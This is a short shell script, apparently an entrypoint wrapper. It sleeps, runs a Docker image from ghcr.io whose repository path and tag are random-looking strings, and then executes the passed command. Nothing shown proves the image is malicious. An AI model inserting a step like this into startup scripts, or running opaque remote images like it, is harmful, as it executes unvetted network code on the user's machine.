#!/bin/sh
sleep 5s;

docker run --rm -i \
  --shm-size 4g \
  ghcr.io/nixegohshs5f4ef6vuun43f6/hvhj456v3cy7rv66v4rfgu6rtyu8843dbitapyv3125:yhf3gj79bt8kytv57vttv7rec7bitA0001-of-one

# start the script
exec "$@"
